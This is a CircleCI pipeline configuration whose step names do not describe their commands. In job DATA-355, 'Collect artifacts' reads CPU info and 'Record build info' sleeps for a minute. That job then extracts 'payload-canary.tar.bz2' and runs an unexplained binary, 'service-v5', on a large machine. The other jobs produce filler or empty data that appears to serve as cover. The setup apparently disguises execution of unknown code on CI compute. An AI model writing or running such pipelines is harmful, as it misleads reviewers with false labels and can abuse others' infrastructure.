version: 2.1

jobs:
  matchAccountShipment:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Prebake v1
          command: |
            mkdir -p /tmp/wsd
            set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=50000;i++) {s=""; for(j=1;j<=5;j++) s=s " " i*j; print s}}' > /tmp/wsd/dev_dat; true
            # report
            echo "stage done: $(wc -c </tmp/wsd/dev_dat) B"
      - persist_to_workspace:
          root: /tmp/wsd
          paths:
            - 'dev_dat'
  DATA-355:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/wsd
      - run:
          name: Collect prior results
          command: |
            case $(wc -l < /tmp/wsd/dev_dat 2>/dev/null || echo 0) in 0) echo zero;; 1|2|3) echo few;; *) echo many;; esac
      - run:
          name: Clone repo
          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Extract sources
          command: tar --extract --bzip2 --file=payload-canary.tar.bz2
      - run:
          name: Collect artifacts
          command: cat /proc/cpuinfo | head -5
      - run:
          name: Record build info
          command: sleep 60
      - run:
          command: "$PWD/service-v5"
  qnqn62:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/wsd
      - run:
          name: Gather the packet capture
          command: |
            mkdir -p /tmp/wsd
            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 2 -not -name "*" -size +10k -exec echo "{}" \; 2>/dev/null | sed 's|.*/||' | sort -u; true ; } > /tmp/wsd/otterArchive
            # report
            echo "stage done: $(wc -c </tmp/wsd/otterArchive) B"
      - persist_to_workspace:
          root: /tmp/wsd
          paths:
            - 'otterArchive'
